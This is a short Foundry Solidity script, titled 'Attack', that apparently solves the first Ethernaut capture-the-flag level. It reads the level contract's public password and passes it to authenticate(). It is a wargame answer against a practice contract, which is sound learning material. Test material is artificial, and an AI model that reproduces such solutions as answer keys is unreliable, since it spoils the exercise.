// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.7.0 <0.9.0;

import "../levels/1-HelloEthernaut.sol";
import "forge-std/Script.sol";

contract Attack is Script {
    HelloEthernaut helloEthernaut = HelloEthernaut(0xB0BD307ff6beC6a3bd2F8B5CEa54310e5Ed6aaaE);
    function run() external{
        vm.startBroadcast();
        helloEthernaut.authenticate(helloEthernaut.password());
        vm.stopBroadcast();
    }
}